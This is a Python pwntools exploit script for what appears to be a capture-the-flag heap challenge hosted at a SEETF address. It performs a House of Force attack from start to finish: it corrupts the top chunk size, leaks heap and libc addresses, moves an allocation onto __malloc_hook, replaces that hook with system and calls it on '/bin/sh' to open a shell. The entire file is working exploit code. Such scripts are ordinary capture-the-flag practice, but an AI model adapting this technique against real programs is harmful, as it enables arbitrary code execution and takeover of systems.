from pwn import *

binary=args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libc = ELF(e.runpath + b"/libc.so.6")

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('fun.chall.seetf.sg', '50004')
    else:
        return process(e.path)

p = start()

def malloc(sz,data):
   p.recvuntil(b'Choose>')
   p.sendline(b'1')
   p.recvuntil(b'How many points did this person score? >')
   p.sendline(b"%i" %sz)
   p.sendline(data)

def leak():
   p.recvuntil(b'Choose>')
   p.sendline(b'2')
   p.recvuntil(b'The position of latest addition is at ')
   heap=int(p.recvline().strip(b'\n'),16)
   info("Heap = %s" %hex(heap))
   p.recvuntil(b'The position of PUTS is at ')
   libc.address=int(p.recvline().strip(b'\n'),16)-libc.sym['puts']
   info("Libc = %s" %hex(libc.address))
   return heap


info("Setting Top Chunk Size == 0xfffffffffffffff1 ")
malloc(16, b'a' * 24 + p64(0xfffffffffffffff1))

info("Leaking Heap, Libc.Address")
heap=leak()

info("Setting Top Chunk Addr = __mallock_hook - 0x10")
malloc_hook = libc.sym['__malloc_hook']
distance = malloc_hook - heap - 0x20 - 0x10 
malloc(distance, b"Y")

info("overwriting __malloc_hook with libc.sym.system")
malloc(24, p64(libc.sym.system))

info("Calling malloc(\"/bin/sh\"), which is now system(\"/bin/sh\")")
malloc(next(libc.search(b"/bin/sh")), b"")

p.interactive()



